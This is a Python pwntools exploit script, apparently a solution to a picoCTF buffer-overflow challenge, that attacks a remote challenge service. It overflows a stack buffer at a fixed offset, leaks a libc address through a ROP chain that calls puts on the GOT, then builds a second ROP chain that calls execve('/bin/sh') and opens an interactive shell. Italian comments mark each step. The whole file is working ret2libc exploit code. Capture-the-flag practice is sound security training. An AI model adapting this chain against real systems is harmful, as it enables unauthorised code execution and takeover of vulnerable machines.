#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['terminator','-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 62289)
    return r


gdbscript = """
    tbreak main
    br do_stuff
    br *do_stuff+151
    continue
    c
""".format(**locals())

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)



def main():
    io = conn()
    io.recvline()
    rip_offset = 136

    #genero ropchain per leakare indirizzo di libc
    r = ROP(exe)
    r.call(exe.sym['puts'],[ exe.got['puts'] ])
    r.call(exe.sym['main'])
    payload = b'A'*rip_offset + r.chain()
    io.sendline(payload)


    # ricostruisco gli indirizzi di libc dall'inizizzo leakato
    puts_addr = io.recvlines(2)[1]
    puts_addr = u64( puts_addr.ljust(8,b'\x00') ) 
    log.success(f"{hex(puts_addr)}")
    libc.address = puts_addr - libc.sym['puts'] 

    # uso ropchain per fare ret2libc e ottenere shell
    r = ROP( [libc])
    log.success(f"{hex(libc.sym['puts'])}")
    r.call(libc.sym['execve'], [ next(libc.search(b'/bin/sh')), 0, 0 ])
    payload = b'A'*rip_offset + r.chain()
    io.recvline()
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()
